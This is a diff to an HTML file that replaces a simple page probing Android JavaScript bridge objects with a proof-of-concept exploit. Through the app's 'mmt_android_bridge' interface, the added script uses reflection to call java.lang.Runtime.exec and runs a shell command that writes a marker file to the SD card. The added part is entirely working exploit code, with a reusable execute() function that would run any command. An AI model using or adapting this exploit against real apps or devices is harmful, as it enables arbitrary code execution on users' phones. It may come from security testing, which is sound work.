@@ -12,28 +12,11 @@
     </script>
 </head>
 <body>
- <h1>JavaScript Interface Test</h1>
-    <p>Click the button to test the interfaces.</p>
-    <button onclick="getAppInfo()">Get App Info</button>
-
-    <script type="text/javascript">
-        function getAppInfo() {
-            // Attempt to call a method on mmt_android_bridge
-            try {
-                var result = mmt_android_bridge.someMethod();
-                alert("mmt_android_bridge.someMethod() result: " + result);
-            } catch (e) {
-                alert("mmt_android_bridge.someMethod() error: " + e);
-            }
-
-            // Attempt to call a method on app_bridge
-            try {
-                var result = app_bridge.someMethod();
-                alert("app_bridge.someMethod() result: " + result);
-            } catch (e) {
-                alert("app_bridge.someMethod() error: " + e);
-            }
-        }
-    </script>
+<script>
+function execute(cmd){
+return window.mmt_android_bridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+}
+execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
+</script>
 </body>
 </html>
